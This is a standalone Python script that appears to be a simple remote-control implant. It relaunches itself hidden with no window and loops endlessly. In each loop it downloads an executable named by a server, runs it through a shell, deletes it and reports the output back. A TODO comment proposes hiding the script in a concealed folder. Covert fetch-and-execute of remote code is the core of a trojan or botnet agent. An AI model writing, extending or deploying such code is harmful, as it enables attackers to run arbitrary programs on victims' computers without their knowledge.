import requests
import subprocess
import shutil
import os
import sys
from urllib.request import urlretrieve

# URL of the API server
API_URL = "http://localhost:80"

def download_and_execute():
    # Download the file
    response = requests.get(f"{API_URL}/agent")
    filename = "task.exe"

    # Download the file from API url, save it in the current directory
    urlretrieve(f"{API_URL}/{response.json()['url']}", filename)

    # Execute the file and
    output = subprocess.check_output(filename, shell=True)
    os.remove(filename)

    return output

def report_result(result):
    requests.post(f"{API_URL}/agent", json={"result": result})

def main():
    while True:
        result = download_and_execute()
        result = str(result.decode("utf-8")).strip()
        report_result(result)

if __name__ == "__main__":
    # Check the first argument to be "hidden"
    if len(sys.argv) == 2 and sys.argv[1] == "hidden":
        main()
    else:
        # Execute the script in a hidden manner
        # TODO: Maybe change the location of the script to be in a hidden folder
        subprocess.Popen([sys.argv[0], 'hidden'], creationflags=subprocess.CREATE_NO_WINDOW)

